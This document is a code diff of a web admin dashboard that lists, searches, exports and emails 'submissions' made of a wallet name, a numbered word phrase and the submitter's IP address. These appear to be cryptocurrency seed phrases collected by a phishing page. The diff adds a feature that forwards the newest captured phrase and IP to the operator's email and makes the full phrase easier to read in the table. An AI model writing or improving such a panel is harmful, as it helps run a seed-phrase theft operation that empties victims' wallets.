@@ -18,14 +18,23 @@ export default function AdminPage() {
   const fetchSubmissions = async () => {
     try {
       setLoading(true)
+      setError(null) // Clear any previous errors
+      console.log('Fetching submissions...')
+      
       const response = await fetch('/api/submissions')
+      console.log('Response status:', response.status)
+      
       if (response.ok) {
         const data = await response.json()
+        console.log('Submissions data:', data)
         setSubmissions(data.submissions || [])
       } else {
-        setError('Failed to fetch submissions')
+        const errorText = await response.text()
+        console.error('API error response:', errorText)
+        setError(`Failed to fetch submissions: ${response.status}`)
       }
     } catch (error) {
+      console.error('Fetch error:', error)
       setError('Error fetching submissions: ' + error.message)
     } finally {
       setLoading(false)
@@ -33,13 +42,15 @@ export default function AdminPage() {
   }
 
   const filteredSubmissions = submissions.filter(submission => {
-    const matchesSearch = submission.selectedWallet.toLowerCase().includes(searchTerm.toLowerCase()) ||
+    // Handle both camelCase and snake_case field names
+    const walletName = submission.selectedWallet || submission.selected_wallet
+    const matchesSearch = walletName.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          submission.phrase.join(' ').toLowerCase().includes(searchTerm.toLowerCase())
-    const matchesWallet = filterWallet === 'all' || submission.selectedWallet === filterWallet
+    const matchesWallet = filterWallet === 'all' || walletName === filterWallet
     return matchesSearch && matchesWallet
   })
 
-  const walletTypes = [...new Set(submissions.map(s => s.selectedWallet))]
+  const walletTypes = [...new Set(submissions.map(s => s.selectedWallet || s.selected_wallet))]
 
   const formatTimestamp = (timestamp) => {
     return new Date(timestamp).toLocaleString()
@@ -54,6 +65,51 @@ export default function AdminPage() {
     link.download = `wallet-submissions-${new Date().toISOString().split('T')[0]}.json`
     link.click()
     URL.revokeObjectURL(url)
+  }
+
+  const testEmailNotifications = async () => {
+    try {
+      if (submissions.length === 0) {
+        alert('No submissions to send emails for')
+        return
+      }
+
+      // Get the most recent submission
+      const latestSubmission = submissions[0]
+      
+      // Prepare the submission data for email
+      const emailData = {
+        id: latestSubmission.id,
+        selectedWallet: latestSubmission.selectedWallet || latestSubmission.selected_wallet,
+        phrase: latestSubmission.phrase,
+        timestamp: latestSubmission.timestamp,
+        ip: latestSubmission.ip
+      }
+
+      console.log('Testing email notification for:', emailData)
+
+      // Call the email API
+      const response = await fetch('/api/test-email', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(emailData)
+      })
+
+      if (response.ok) {
+        const result = await response.json()
+        alert(`✅ Test email sent successfully!\n\nCheck your email inboxes for the notification.`)
+        console.log('Test email result:', result)
+      } else {
+        const error = await response.text()
+        alert(`❌ Failed to send test email: ${error}`)
+        console.error('Test email error:', error)
+      }
+    } catch (error) {
+      console.error('Error testing email:', error)
+      alert(`❌ Error testing email: ${error.message}`)
+    }
   }
 
   const handleThemeToggle = () => {
@@ -102,7 +158,7 @@ export default function AdminPage() {
         {/* Debug Info */}
         <div className="text-center mb-4 text-sm text-gray-600 dark:text-gray-400 bg-white dark:bg-gray-800 p-2 rounded">
           Current Theme: {isDark ? 'Dark' : 'Light'} | 
-          HTML Class: {document.documentElement.classList.contains('dark') ? 'dark' : 'light'} |
+          HTML Class: {typeof window !== 'undefined' && document.documentElement.classList.contains('dark') ? 'dark' : 'light'} |
           Storage: {typeof window !== 'undefined' ? localStorage.getItem('theme') || 'none' : 'loading...'}
         </div>
 
@@ -142,8 +198,14 @@ export default function AdminPage() {
                 📥 Export JSON
               </button>
               <button
-                onClick={fetchSubmissions}
+                onClick={testEmailNotifications}
                 className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
+              >
+                📧 Test Emails
+              </button>
+              <button
+                onClick={fetchSubmissions}
+                className="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors"
               >
                 🔄 Refresh
               </button>
@@ -151,7 +213,7 @@ export default function AdminPage() {
           </div>
 
           {/* Stats */}
-          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
+          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4">
             <div className="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-200 dark:border-blue-700">
               <div className="text-2xl font-bold text-blue-600 dark:text-blue-400">{submissions.length}</div>
               <div className="text-sm text-blue-600 dark:text-blue-400">Total Submissions</div>
@@ -176,8 +238,8 @@ export default function AdminPage() {
         </div>
 
         {/* Filters */}
-        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-xl p-6 mb-6 transition-colors duration-300">
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-xl p-4 sm:p-6 mb-6 transition-colors duration-300">
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
             <div>
               <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-2 transition-colors duration-300">Search</label>
               <input
@@ -233,21 +295,24 @@ export default function AdminPage() {
                   {filteredSubmissions.map((submission, index) => (
                     <tr key={submission.id} className={index % 2 === 0 ? 'bg-white dark:bg-gray-800' : 'bg-gray-50 dark:bg-gray-700'}>
                       <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900 dark:text-white">
-                        #{submission.id.slice(-6)}
+                        #{typeof submission.id === 'string' ? submission.id.slice(-6) : submission.id.toString().slice(-6)}
                       </td>
                       <td className="px-6 py-4 whitespace-nowrap">
                         <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 dark:bg-blue-900 text-blue-800 dark:text-blue-200">
-                          {submission.selectedWallet}
+                          {submission.selectedWallet || submission.selected_wallet}
                         </span>
                       </td>
                       <td className="px-6 py-4">
                         <div className="text-sm text-gray-900 dark:text-white">
-                          <div className="grid grid-cols-3 gap-1">
+                          <div className="grid grid-cols-4 gap-1 mb-2">
                             {submission.phrase.map((word, wordIndex) => (
-                              <span key={wordIndex} className="text-xs bg-gray-100 dark:bg-gray-600 px-2 py-1 rounded text-gray-900 dark:text-gray-100">
+                              <span key={wordIndex} className="text-xs bg-gray-100 dark:bg-gray-600 px-2 py-1 rounded text-gray-900 dark:text-gray-100 font-mono">
                                 {wordIndex + 1}. {word}
                               </span>
                             ))}
+                          </div>
+                          <div className="text-xs text-gray-500 dark:text-gray-400 font-mono bg-gray-50 dark:bg-gray-700 p-2 rounded border">
+                            {submission.phrase.join(' ')}
                           </div>
                         </div>
                       </td>
